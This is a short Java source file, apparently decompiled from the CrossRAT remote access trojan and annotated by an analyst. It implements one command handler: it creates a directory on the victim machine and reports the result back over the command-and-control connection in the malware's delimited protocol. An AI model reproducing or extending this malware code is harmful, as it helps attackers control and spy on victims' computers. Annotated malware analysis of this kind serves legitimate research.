package crossrat;

import java.io.DataOutputStream;
import java.io.File;

final class a extends Thread {
   private String a;
   private String b = null;

   public a(String var1) {
      this.a = var1;
   }

   public final void run() {
      File var1 = new File(this.a);
      DataOutputStream var2 = null;

      try {
         // open new connection to k.k
         var2 = new DataOutputStream(k.k.getOutputStream());
      } catch (Exception var6) {
         var6.printStackTrace();
      }
      // if directory is not exists, 원하는 file directory 생성
      if (!var1.exists()) {
         boolean var3;
         try {
            var1.mkdir();
            var3 = true;
         } catch (SecurityException var5) {
            var3 = false;
            this.b = "0";
         }

         if (var3) {
            this.b = "1";
         }
      } else {
         this.b = "2";
      }

      try {
         var2.writeBytes(k.g + k.d + k.D + k.d + this.b + k.d + "&&&");
         // [k.g]$#@@0007$#@[1 or 2]$#@&&&
      } catch (Exception var4) {
         var4.printStackTrace();
      }
   }
}
